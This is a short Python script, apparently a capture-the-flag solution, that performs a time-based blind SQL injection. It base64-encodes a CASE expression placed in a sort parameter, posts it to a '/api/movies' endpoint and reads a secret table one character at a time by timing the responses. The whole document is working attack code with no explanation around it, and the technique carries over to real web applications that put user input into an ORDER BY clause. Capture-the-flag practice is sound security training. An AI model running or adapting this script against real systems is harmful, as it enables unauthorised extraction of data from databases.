# Script to find the value form table name

import requests
import base64
import json
import time

url = '<url for the chall>'

flag = ''
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
sleep_time = 1

while True:
    found = False
    for i in chars:
        payload = f"(CASE WHEN (SELECT SUBSTR(text,{len(flag)+1},1) FROM secret_oezxsbhh_text WHERE id=1)='{i}' THEN id + zhopi({sleep_time}) ELSE rating END) DESC"

        encoded_payload = base64.b64encode(payload.encode()).decode('utf-8')

        data = {
            'sequence': encoded_payload
        }
        start_time = time.time()
        r = requests.post(
            url + '/api/movies',
            data=json.dumps(data),
            headers={'Content-Type': 'application/json'}
        )
        end_time = time.time()

        elapsed_time = end_time - start_time

        if elapsed_time >= sleep_time:
            flag += i
            found = True
            print(f"\nFound character: {i}, updated flag: {flag}")
            break
        else:
            print(f"\rTrying for: {i} at index: {len(flag)}, elapsed time: {elapsed_time}",end="")

    if not found:
        print("\nNo matching character found.")
        break

print(f"\nFinal flag: {flag}")
